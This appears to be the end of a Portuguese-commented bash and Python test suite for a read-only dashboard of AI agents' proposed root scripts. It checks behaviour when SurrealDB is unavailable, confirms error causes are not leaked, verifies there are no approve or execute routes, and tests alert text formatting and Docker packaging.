check "/pedidos: título inteiro no link"               bash -c 'grep -qF "\">$2</a> <span class=\"sub\">$3</span>" "$1"' _ <(page /pedidos) "$T337" "$P337"
check "/v1/tray: título inteiro"                       jqe --arg t "$T337" --arg id "$P337" '.proposals.pending | map(select(.id == $id)) | length == 1 and .[0].title == $t' <<<"$(page /v1/tray)"
post logs "$TMP/t337.json" >/dev/null
check "reenvio do mesmo evento: título segue inteiro"  jqe --arg t "$T337" --arg id "$P337" '.proposals.pending | map(select(.id == $id)) | length == 1 and .[0].title == $t' <<<"$(page /v1/tray)"

# os três pedidos saem do SurrealDB: as seções seguintes contam os pedidos do exemplo
surreal_q "DELETE pedido WHERE record::id(id) IN ['$P337', '$P337-b', '$P337-c']" >/dev/null

# ---------------------------------------------------------------- 8. SurrealDB fora
surreal_stop
page /pedidos > "$TMP/down.html"
check "SurrealDB fora: /pedidos 503 (a lista é o estado)" test "$(code "${C[@]}" "$STUDIO_URL/pedidos")" = 503
check "SurrealDB fora: a página diz o que faltou, sem a causa" bash -c 'grep -q "O estado dos pedidos (SurrealDB) não pôde ser lido" "$1" && ! grep -qi "urlopen\|refused\|127\.0\.0\.1" "$1"' _ "$TMP/down.html"
page "$U1" > "$TMP/down1.html"
check "SurrealDB fora: página do pedido 200, com o script" bash -c 'test "$(curl -s -o /dev/null -w "%{http_code}" -H "$3" "$4")" = 200 && cmp -s "$2" <(python3 -c "import html, re, sys; sys.stdout.write(html.unescape(re.search(r\"data-script>(.*?)</pre>\", open(sys.argv[1]).read(), re.S).group(1)))" "$1")' _ "$TMP/down1.html" "$TMP/p1.sh" "${C[1]}" "$STUDIO_URL$U1"
check "SurrealDB fora: aviso e estado desconhecido (nunca pendente por palpite)" bash -c 'grep -q data-estado-indisponivel "$1" && grep -q "data-state=\"\"" "$1" && grep -q "<dt>Estado</dt><dd>desconhecido</dd>" "$1"' _ "$TMP/down1.html"
check "SurrealDB fora: título, como e agente vêm do evento" jqe '.as == "root" and .agent == "claude" and .host == "oute-server" and (.text | test("Título Reiniciar <b>nginx</b> & cia"))' <<<"$(data < "$TMP/down1.html" | jq -c '.[] | select(has("resumo-pedido"))')"
check "SurrealDB fora: pedido só do SurrealDB = 404"   test "$(code "${C[@]}" "$STUDIO_URL/pedido?id=$P4")" = 404
check "SurrealDB fora: aviso no stderr, sem 500"       bash -c 'grep -q "tela: lista de pedidos (SurrealDB) falhou" "$1" && grep -q "tela: estado do pedido (SurrealDB) falhou" "$1" && ! grep -q "respondi 500" "$1"' _ "$TMP/s/stderr"
studio_stop

# ---------------------------------------------------------------- 9. lógica direto em Python
surreal_start "$TMP/sdb" || { cat "$TMP/sdb/log"; die "SurrealDB não voltou"; }
SURREAL_URL="$SURREAL_URL" SURREAL_TEST_PASS="$SURREAL_TEST_PASS" PYTHONPATH="$ROOT/docker/agent-studio:$ROOT/tests/lib" \
  "$STUDIO_PY" - "$TMP/s/db.duckdb" "$TMP/p1.sh" > "$TMP/py.out" 2>&1 <<'PY'
import os, re, sys
import duckdb
from agent_studio import alert_text, alerts, proposals, web
from agent_studio.app import create_app
from agent_studio.surreal import Surreal
from pycheck import check
from studio_asgi import TOKEN, Odd, get

con = duckdb.connect(sys.argv[1], read_only=True)
script = open(sys.argv[2]).read()
sdb = Surreal(os.environ["SURREAL_URL"], "root", os.environ["SURREAL_TEST_PASS"])
P1, P4 = "20260930-120000-reiniciar-nginx", "20260930-130000-so-decidido"

r = proposals.listing(sdb, pending_limit=1, recent_limit=2)
check("lista: os limites cortam, o total de pendentes conta tudo",
      [p["id"] for p in r["pending"]] == ["p <b>5</b>&x=é"] and r["pending_total"] == 2 and len(r["recent"]) == 2)
html = web._env().get_template("proposals.html").render(**r, pending_limit=1)
check("lista: o corte dos pendentes aparece na página", "Mostrando os 1 mais recentes de 2" in html)
check("estado: pedido sem registro = None", proposals.state(sdb, "nao-existe") is None)
check("estado: registro do pedido decidido", proposals.state(sdb, P4)["decision"] == "executado")
check("evento: pedido sem evento no DuckDB = None", proposals.event(con, "nao-existe") is None and proposals.event(con, P4) is None)
ev = proposals.event(con, P1)
m = proposals.merged(P1, ev, None)
check("pedido só com o evento: fatos do evento, estado nulo",
      m["state"] is None and m["as"] == "root" and m["agent"] == "claude" and m["script"] == script
      and m["size"] == len(script.encode()) and re.fullmatch(r"20\d\d-\d\d-\d\dT\d\d:\d\d:\d\d\.0{9}Z", m["proposed_at"]))
m = proposals.merged("x", None, {"id": "x", "state": "decidido", "decision": "recusado", "title": None, "extra": 1})
check("pedido só com o registro: sem script, sem campo de fora", m["script"] is None and m["state"] == "decidido"
      and m["title"] is None and "extra" not in m)
m = proposals.merged(P1, ev, {"state": "decidido", "agent": "outro", "host": None})
check("pedido com os dois: o registro vale e campo nulo dele não apaga o do evento",
      m["state"] == "decidido" and m["agent"] == "outro" and m["host"] == "oute-server" and m["script"] == script)
check("pedido com os dois: script, sha256 do exibido e versões são só do evento",
      proposals.merged(P1, ev, {"script": "x", "shown_sha256": "y", "versions": 9})
      == proposals.merged(P1, ev, None) and ev["versions"] == 2 and m["shown_sha256"] == ev["shown_sha256"])
big = {"time_unix_nano": 0, "agent": "claude", "title": "t", "as": "user", "script": "a" * 70000}
check("sha256 do exibido: sem script = None; como o oute approve, só os primeiros 64 KiB do arquivo contam",
      proposals.approve_sha({"script": None}) is None and len(proposals.approve_sha(big)) == 12
      and proposals.approve_sha(big) == proposals.approve_sha({**big, "script": "a" * 69999 + "b"})
      and proposals.approve_sha(big) != proposals.approve_sha({**big, "script": "b" + "a" * 69999}))
check("pedidos não leem a saída do host (só o corpo do proposed)",
      "oute.canal.proposed" in proposals._EVENT and "decided" not in proposals._EVENT)

# app sem SurrealDB (só DuckDB); os alertas são os de verdade, do mesmo DuckDB
class Store:
    calls = 0
    def alerts(self, *a):
        Store.calls += 1
        return alerts.evaluate(con, *a)
    def proposal(self, pid):
        return proposals.event(con, pid)
    def conversation_logs(self, *a):
        return {"logs": [], "next_offset": None}
app = create_app(Store(), TOKEN)
status, body = get(app, "/pedidos")
check("sem SurrealDB: /pedidos 503, com o motivo", status == 503 and "sem SurrealDB" in body)
status, body = get(app, "/pedido", f"id={P1}")
check("sem SurrealDB: página do pedido 200 com o script, estado desconhecido e sem aviso",
      status == 200 and 'data-state=""' in body and "<dd>desconhecido</dd>" in body and "data-estado-indisponivel" not in body
      and "data-script" in body)
check("sem SurrealDB: pedido sem evento = 404", get(app, "/pedido", f"id={P4}")[0] == 404)

# alertas: um cálculo por página inteira; trecho do htmx não calcula
Store.calls = 0
status, body = get(app, "/conversa/logs", "id=x", headers=[("HX-Request", "true")])
check("trecho do htmx: sem cálculo de alertas", status == 200 and Store.calls == 0 and "alertas" not in body)
status, body = get(app, "/conversa/logs", "id=x")
check("página de detalhe inteira: um cálculo de alertas, e a faixa não aparece (#467)", status == 200 and Store.calls == 1 and 'id="alertas"' not in body)
Store.calls = 0
status, body = get(app, "/pedidos")
check("página de lista inteira: um cálculo de alertas, e a faixa aparece", status == 503 and Store.calls == 1 and 'id="alertas"' in body)
class NoAlerts(Store):
    def alerts(self, *a):
        raise RuntimeError("segredo-da-falha")
status, body = get(create_app(NoAlerts(), TOKEN), "/pedidos")
check("alertas que falham: a página sai com o aviso, sem a causa",
      status == 503 and "Os alertas do pipeline não puderam ser calculados" in body and 'data-alertas=""' in body
      and "segredo-da-falha" not in body)
status, body = get(create_app(NoAlerts(), TOKEN), "/pedido", f"id={P1}")
check("alertas que falham: o detalhe do pedido sai inteiro e sem a faixa",
      status == 200 and "segredo-da-falha" not in body and "data-script" in body and "data-alertas" not in body)
class Broken(Store):
    def proposal(self, pid):
        raise RuntimeError("segredo-da-falha")
status, body = get(create_app(Broken(), TOKEN), "/pedido", f"id={P1}")
check("leitura do DuckDB que falha: 500, sem a causa, com os alertas",
      status == 500 and "segredo-da-falha" not in body and "A consulta falhou" in body and 'id="alertas"' in body)
# SurrealDB que responde fora do formato
app = create_app(Store(), TOKEN, surreal=Odd())
status, body = get(app, "/pedidos")
check("SurrealDB com resposta inesperada: lista 503", status == 503 and "não pôde ser lido" in body)
status, body = get(app, "/pedido", f"id={P1}")
check("SurrealDB com resposta inesperada: pedido 200 com aviso", status == 200 and "data-estado-indisponivel" in body
      and "data-script" in body)

# a tela não tem ação: nenhuma rota que escreve além do login, do logout e da ingestão
app = create_app(Store(), TOKEN, surreal=sdb)
writes = sorted((r.path, m) for r in app.routes for m in (getattr(r, "methods", None) or ()) if m not in ("GET", "HEAD"))
check("rotas que não são leitura: só login, logout e ingestão",
      writes == [("/login", "POST"), ("/logout", "POST"), ("/v1/logs", "POST"), ("/v1/metrics", "POST"), ("/v1/traces", "POST")])
check("nenhuma rota de aprovar, recusar ou executar",
      not [r.path for r in app.routes if re.search(r"aprov|approv|recus|reject|decid|exec|run", r.path)])
status, body = get(app, "/pedido", f"id={P1}", method="POST")
check("POST no pedido: 405", status == 405)

# texto dos alertas: só apresentação, por unidade
def a(unit, value, limit, kind="queue", **ev):
    return {"type": kind, "value": value, "unit": unit, "limit": limit, "evidence": ev}
val = alert_text.text
check("alerta: fila", val(a("ratio", 0.8, 0.5)) == "80% da fila (limite 50%)")
check("alerta: spool em bytes", val(a("bytes", 46 * 2**20, 40 * 2**20)) == "46,0 MiB (limite 40,0 MiB)")
check("alerta: host sem dado", val(a("seconds", 3600, 1800.0)) == "há 1 h 00 min (limite 30 min 00 s)")
check("alerta: host sem registro na janela lida",
      val(a("seconds", None, 1800.0, note="nenhum registro nas últimas 24 h")) == "nenhum registro nas últimas 24 h")
check("alerta: destino recusando", val(a("failed_items", 5.0, 0, window_minutes=15)) == "5 itens recusados nos últimos 15 min")
check("alerta: spool descartando", val(a("dropped_events", 1234, 0, window_minutes=60)) == "1.234 eventos descartados nos últimos 60 min")
check("alerta: cota", val(a("pct", 95.5, 90)) == "95,5% (limite 90%)")
check("alerta: unidade desconhecida sai crua", val(a("coisas", 7, 1)) == "7 coisas" and val(a("coisas", None, 1)) == "sem valor")
check("alerta: título de cada tipo; tipo desconhecido sai com o próprio nome",
      set(alert_text.TITLES) == set(alerts.ALL_TYPES) and alert_text.title(a("x", 1, 1, kind="novo")) == "novo")
check("idade: hora inválida ou ausente não quebra a página", web._ago("lixo") == "—" and web._ago(None) == "—")
src = open(web.__file__).read() + open(os.path.join(os.path.dirname(web.__file__), "templates", "base.html")).read()
check("alertas sem regra duplicada: a tela não lê métrica nem limite (só o alerts.evaluate)",
      not re.search(r"otelcol_|FROM metrics|queue_max_ratio|no_data_minutes|spool_max_bytes|oute\.emit\.spool", src)
      and "store.alerts" in src)
PY
grep -v '^Traceback\|^  \|^RuntimeError\|^TypeError\|^IndexError\|^AttributeError\|^$\|tela: .* falhou' "$TMP/py.out" || true
check_py "$TMP/py.out"
check "lógica em Python: os 36 casos rodaram"          test "$((n_ok + n_fail))" = 36

# ---------------------------------------------------------------- 10. imagem
check "templates dos pedidos vão na imagem (dentro do pacote copiado)" bash -c 'test -f "$1/templates/proposals.html" && test -f "$1/templates/proposal.html" && grep -q "COPY docker/agent-studio/agent_studio /opt/agent-studio/app/agent_studio" "$2/docker/Dockerfile"' _ "$PKG" "$ROOT"
check "compose: agent-studio só em 127.0.0.1"          bash -c 'grep -A40 "^  agent-studio:" "$1" | grep -q "\"127.0.0.1:\${OUTE_AGENT_STUDIO_PORT:-8430}:8430\""' _ "$ROOT/docker/compose.yaml"

check_end
